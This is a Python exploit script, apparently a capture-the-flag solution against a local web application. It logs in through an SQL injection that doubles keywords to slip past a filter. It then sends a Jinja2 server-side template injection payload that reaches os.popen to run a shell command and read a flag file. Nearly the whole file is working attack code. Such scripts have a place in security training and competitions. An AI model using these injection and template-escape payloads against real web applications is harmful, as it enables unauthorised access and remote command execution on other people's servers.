import requests
import sys
import re



def exploit():
	ses = requests.session()
	login_data = {
	'username':"username=a'/**/ununionion/**/selselectect/**/'827ccb0eea8a706c4c34a16891f84e7b",
	'password':"12345"
	}

	login_url = url + 'login'
	
	for i in range(5):
		logins = ses.post(login_url, data = login_data)
		if "巫女赛高" in logins.text:
			break

	payload = r"""{% for c in ''.__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__.get('__builtins__').get('__import__')("os").popen('cat /flag').read() }}{% endif %}{% endfor %}"""
	get_flag_url = url + 'index?username=' + payload
	get_flag = ses.get(get_flag_url)
	gflag = re.findall(r'Welcome (.*)',get_flag.text)
	flag = gflag[0]
	print(flag)
	


if __name__ == '__main__':
	url = 'http://localhost:8003/'
	exploit()

    


